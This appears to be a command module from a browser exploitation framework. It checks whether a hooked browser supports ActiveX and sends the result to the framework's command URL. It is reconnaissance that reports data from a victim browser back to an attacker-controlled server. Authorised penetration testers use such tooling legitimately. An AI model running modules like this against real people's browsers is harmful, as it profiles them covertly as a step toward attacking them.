//
// Copyright (c) 2006-2025 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (Server) - https://serverproject.com
// See the file 'doc/COPYING' for copying permission
//

server.execute(function() {

	var result = (server.browser.hasActiveX())? "Yes" : "No";

	server.net.send("<%= @command_url %>", <%= @command_id %>, "activex="+result);

});

